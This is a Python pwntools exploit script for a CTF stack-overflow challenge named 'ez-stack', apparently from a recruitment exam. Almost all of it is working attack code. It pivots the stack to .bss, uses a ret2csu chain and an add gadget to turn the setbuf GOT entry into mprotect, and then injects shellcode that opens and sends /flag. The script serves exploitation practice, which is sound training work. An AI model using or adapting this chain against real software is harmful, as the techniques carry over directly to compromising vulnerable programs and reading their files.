#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')

binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)
    context.terminal = [
    os.path.expanduser('~/.local/bin/kitty-gdb'),
    os.path.abspath(binary), 
    str(io.pid)  
    ]
# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/CTF_PWN/PROJECT/山海关招新/预备队pwn考核/ez-stack/glibc/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# ========== Exploit 开始 ==========
# 0x4011bc :  add dword ptr [rbp - 0x3d], ebx ; nop ; ret
magic_gagdet =  0x4011bc
csu_end = 0x000000000040132A
csu_start = 0x0000000000401310
leave_ret = 0x0000000000401267
rdi = 0x0000000000401333
bss = elf.bss()+0x300
ret = 0x000000000040101a
p("bss",hex(elf.bss()))

def csu(funs,args1,args2,args3):
    pay = p64(csu_end)+p64(0)+p64(1)+p64(args1)+p64(args2)+p64(args3)
    pay += p64(funs)+p64(csu_start)+b'a'*0x38
    return pay

def exp():
    # [+] ======== first gets to bss ============ [+]
    pay = b'a'*0x10+p64(bss-0x8)+p64(rdi)+p64(bss)+p64(elf.plt.gets)+p64(leave_ret)
    sla("[*] ez-stack 1",pay)

    # [+] =========== Then we used CSU change to mprotect ============= [+]
    pay = p64(csu_end)
    pay += p64(libc.sym["mprotect"]-libc.sym["setbuf"])+p64(elf.got.setbuf+0x3d)+p64(0)*4+p64(magic_gagdet)
    pay += csu(elf.got.setbuf,elf.bss()-0xd0,0x1000,7)
    pay += p64(ret)*0x10
    pay += p64(bss+len(pay)+0x8)
    pay += asm(shellcraft.openat(-100, '/flag'))
    pay += asm(shellcraft.sendfile(1,'rax',0,0x50))

    sleep(3)
    #gdb.attach(io)
    sl(pay)
    #pause()
exp()
itr()
